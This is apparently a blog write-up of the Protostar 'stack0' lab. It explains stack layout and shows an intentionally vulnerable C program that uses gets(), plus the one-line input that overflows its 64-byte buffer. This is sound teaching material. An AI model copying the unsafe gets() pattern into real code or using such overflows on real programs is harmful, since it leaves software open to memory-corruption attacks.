---
author: alvaro
comments: true
layout: post
title: Stack 0 Protostart
categories:
- Archive
tags:
- security
---

I have started to play with the protostar VM along with nebula. This VM presents the concept about the memory issues as buffer overflows in stack and in the heap, format string and so on.

The first exercise present a buffer overflow. The code is as follows.

```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```

To resolve this puzzle we should have clear how is carried out the flow execution of a program. In the C language the stack is a structure that is used to pass argument to the function, save return address and also to save the local variables. So in the following C code the stack would be.


```C

void func( int a, int b)
{
	int c;
	return;
}
```

```
The stack grows downwards

+————————————+
| argument b |  The local variables are saved in reverse order.
+————————————+
| argument a |
+————————————+
| return     |  The return address is saved automatically by the 
| address    |  call instruction in assembly.
+————————————+
|            |  The base pointer register. Is used to reference 
|    EBP     |  inside the function without calculate offset 
|            |  respect with the ESP.
+————————————+
|  local c   |
+————————————+
```

The stack in the main function is.

```
+————————————+
| argument 2 |  
+————————————+
| argument 1 |
+————————————+
| return     |  
| address    |  
+————————————+
|            |   
|    EBP     |   
|            |  
+————————————+
|  modified  |
+————————————+
|  buffer    |
+————————————+
```

So if we are able to write more than 64 bytes in buffer we can overwrite the value in `modified`. But Are we able to achieve that? The answers is yes due to the code is using an insecure function `gets`. It does not limit the input so we are able to write more than 64 bytes. So with the following we can change the value.

```bash
$  printf "%065x" 1
00000000000000000000000000000000000000000000000000000000000000001
$ ./stack0
00000000000000000000000000000000000000000000000000000000000000001
you have changed the 'modified' variable

```

If you want to augment your knowledge about stack and how to exploit it I encourage to read the article [Smash the Stack For Fun And Profit by Aleph One](http://q.hscott.net/reads/stack_smashing.pdf)

{% include twitter_plug.html %}
